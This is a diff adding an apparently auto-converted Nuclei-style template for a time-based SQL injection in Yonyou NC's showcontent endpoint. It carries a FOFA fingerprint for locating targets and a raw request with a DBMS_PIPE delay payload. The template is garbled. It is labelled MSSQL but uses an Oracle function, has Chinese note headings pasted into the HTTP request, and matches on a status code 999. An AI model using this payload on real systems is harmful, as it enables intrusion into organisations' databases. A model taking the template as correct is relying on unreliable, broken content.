@@ -1,0 +1,43 @@
+id: poc-zlumiqcbrh9oskg4
+info:
+  name: 用友 NC showcontent SQL注入漏洞-mssql
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zlumiqcbrh9oskg4'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zlumiqcbrh9oskg4
+    fofa: icon_hash="1085941792"
+http:
+- raw:
+  - 'GET /ebvp/infopub/showcontent?id=1''+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,5)-- HTTP/1.1
+
+
+    Accept-Encoding: identity
+
+
+    Connection: close
+
+
+    Content-Type: text/xml; charset=utf-8
+
+
+    # 响应代码特征
+
+    999
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 999
+    type: status
